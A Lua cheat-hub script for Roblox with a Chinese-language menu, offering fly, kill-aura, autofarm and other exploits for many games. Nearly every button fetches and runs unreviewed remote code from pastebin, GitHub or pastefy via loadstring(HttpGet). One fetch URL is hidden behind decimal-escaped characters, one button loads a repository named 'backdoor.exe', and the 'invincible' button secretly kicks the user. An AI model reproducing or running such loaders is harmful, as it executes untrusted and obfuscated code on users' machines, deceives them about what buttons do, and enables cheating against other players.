local CoreGui = game:GetService("StarterGui")

CoreGui:SetCore("SendNotification", {
    Title = "河脚本二代中心（强锁死爹烂妈）",
    Text = "河脚本中心正在加载（反挂机已开启）",
    Duration = 5, 
})
print("反挂机开启")
		local vu = game:GetService("VirtualUser")
		game:GetService("Players").LocalPlayer.Idled:connect(function()
		   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
		   wait(1)
		   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
		end)
local OrionLib = loadstring(game:HttpGet('https://pastebin.com/raw/SePpsSPZ'))()
local Window = OrionLib:MakeWindow({Name = "河脚本中心", HidePremium = false, SaveConfig = true,IntroText = "欢迎使用河脚本中心", ConfigFolder = "欢迎使用河脚本中心 可能会持续更新"})
local about = Window:MakeTab({
    Name = "河脚本",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

about:AddParagraph("您的用户名:"," "..game.Players.LocalPlayer.Name.."")
about:AddParagraph("您的注入器:"," "..identifyexecutor().."")
about:AddParagraph("您当前服务器的ID"," "..game.GameId.."")            
                                      
local Tab = Window:MakeTab({
  Name = "通用脚本",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
Tab:AddButton({
	Name = "飞",
	Callback = function()

loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\90\66\122\99\84\109\49\102\34\41\41\40\41\10")()

end
})
Tab:AddButton({
	Name = "踢人",
	Callback = function()

loadstring(game:HttpGet(('https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua'),true))()

end
})
Tab:AddButton({
	Name = "无敌",
	Callback = function()

game.Players.LocalPlayer:Kick()

end
})                                                                                                                                                                                   local Tab = Window:MakeTab({
  Name = "忍者传奇",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
Tab:AddButton({
	Name = "最快上影子",
	Callback = function()                                                                                                                                    
      --SCRIPT!
loadstring(game:HttpGet("https://raw.githubusercontent.com/XRoLLu/Rolly_Hub/main/open-source-trash-loader.exe.yeah"))()

--JOIN MY DISCORD SERVER
--https://discord.gg/dWUdqZUvNB                                                                                                                              
end                                                                                       
})                                                                                                                                                                                   local Tab = Window:MakeTab({
  Name = "伐木",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
Tab:AddButton({
	Name = "The most powerful lumberjack",
	Callback = function()                                                                      
loadstring(game:GetObjects("rbxassetid://1468845733")[1].Source)()                                                                                                    
end
})
Tab:AddButton({
	Name = "LT2自动购买",
	Callback = function()                                                                      
 loadstring(game:HttpGet("https://pastebin.com/raw/6mxaahUH", true))()   
                          
end
})                                                                                                                                                                                   local Tab = Window:MakeTab({
  Name = "刀刃球",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
Tab:AddButton({
	Name = "最强无敌远近脚本",
	Callback = function()                                                                                                                                                              
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Alexisisback/Universall/refs/heads/main/Testblade.lua", true))()                                                                                            
end
})
Tab:AddButton({
	Name = "国人自制最强",
	Callback = function()                                                                                                                                     
  loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaoxuxu2333/RobloxScripts/main/Scripts/Blade%20Ball/v1.lua"))()                                                                                        
end
})                                                                                                                                                                                   local Tab = Window:MakeTab({
  Name = "巴掌模拟器",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
Tab:AddButton({
	Name = "巴掌全功能",
	Callback = function()                                                                     
 --current user using the Gui-XxYouMetDeathXx--This Gui Made By VesilicsHD--local ScreenGui = Instance.new("ScreenGui")local Main = Instance.new("Frame")local AutoXP = Instance.new("TextButton")local AutoRebirth = Instance.new("TextButton")local Credits = I                                                                                              
end
})                                                                                                                                                                                   local Tab = Window:MakeTab({
  Name = "力量传奇",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
Tab:AddButton({
	Name = "king",
	Callback = function()                                                                     
 loadstring(game:HttpGet('https://raw.githubusercontent.com/jynzl/main/main/Musclas%20Legenos.lua'))()                                                                                
end
})
Tab:AddButton({
	Name = "noce",
	Callback = function()                                                                     
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Vice1337/free-scripts-for-roblox/main/Muscle-Legends-3623096087"))()                                                                                               
end
})                                                                                                                                                                                   local Tab = Window:MakeTab({
  Name = "速度传奇",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
Tab:AddButton({
	Name = "危险刷步数(易卡)",
	Callback = function()                                                                                                                                                              loadstring(game:HttpGet("https://pastebin.com/raw/cwCdNqds"))()                                                                                           
end
})                                                                                                                                                                                    local Tab = Window:MakeTab({
  Name = "doors",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
Tab:AddButton({
	Name = "doors1",
	Callback = function()                                                                     
 loadstring(game:HttpGet(('https://pastebin.com/raw/R8QMbhzv')))()                                                                                     
end
})                                                                                                                                                                                    local Tab = Window:MakeTab({
  Name = "bf 海贼王",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
Tab:AddButton({
	Name = "not 1",
	Callback = function()                                                                     
loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()                                                                                  
end
})
Tab:AddButton({
	Name = "not 2",
	Callback = function()                                                                     
 --Name: "Blox Fruits Script GUI | THE #1 FREE AUTOFARM GUI | UPDATED MARCH 2022"loadstring(game:HttpGet"https://raw.githubusercontent.com/xDepressionx/Free-Script/main/AllScript.lua")()                                                                                
end
})                                                                                                                                                                                   local Tab = Window:MakeTab({
  Name = "压力",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
Tab:AddButton({
	Name = "超强躲怪",
	Callback = function()                                                                     
 loadstring(game:HttpGet(('https://github.com/DocYogurt/Main/raw/main/Scripts/Pressure')))()      
end
})                                                                                                                                                                                   local Tab = Window:MakeTab({
  Name = "sol’rng",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
Tab:AddButton({
	Name = "nb",
	Callback = function()                                                                     
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/era9/main/sols"))()                                                                               
end
})                                                                                                                                                                                   local Tab = Window:MakeTab({
  Name = "俄亥",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
Tab:AddButton({
	Name = "杀戮光环",
	Callback = function()                                                                            
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Alan0947383/Demonic-HUB-V2/main/S-C-R-I-P-T.lua",true))()                                                                                
end
})
Tab:AddButton({
	Name = "end tade",
	Callback = function()                                                                       
 loadstring(game:HttpGet(('https://pastefy.app/diEUuFT5/raw'),true))()                                                                                  
end
})                                                                                                                                                                                  local Tab = Window:MakeTab({
  Name = "战斗勇士",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
Tab:AddButton({
	Name = "范围爆头",
	Callback = function()                                                                                                       
loadstring(game:HttpGet(('https://pastefy.app/aXBVsabQ/raw'),true))()                                                                               
end
})
Tab:AddButton({
	Name = "sing",
	Callback = function()                                                                      
loadstring(game:HttpGet("https://projecthook.xyz/scripts/free.lua"))()loadstring(game:HttpGet("https://raw.githubusercontent.com/IsaaaKK/cwhb/main/cw.txt"))()                                                                                        
end
})                                                                                                                                                                                  local Tab = Window:MakeTab({
  Name = "忍者传奇二",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
Tab:AddButton({
	Name = "cash back",
	Callback = function()                                                                           
loadstring(game:HttpGet("https://raw.githubusercontent.com/why-png/scriptstuffz/master/ninjaleg2", true))()                                                                                      
end
})                                                                                                                                                                                  local Tab = Window:MakeTab({
  Name = "鱼",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })
Tab:AddButton({
	Name = "乌托邦 鱼",
	Callback = function()                                                                       
loadstring(game:HttpGet("https://pastefy.app/xXwLngQD/raw"))()                                                                                              
end
})                                                             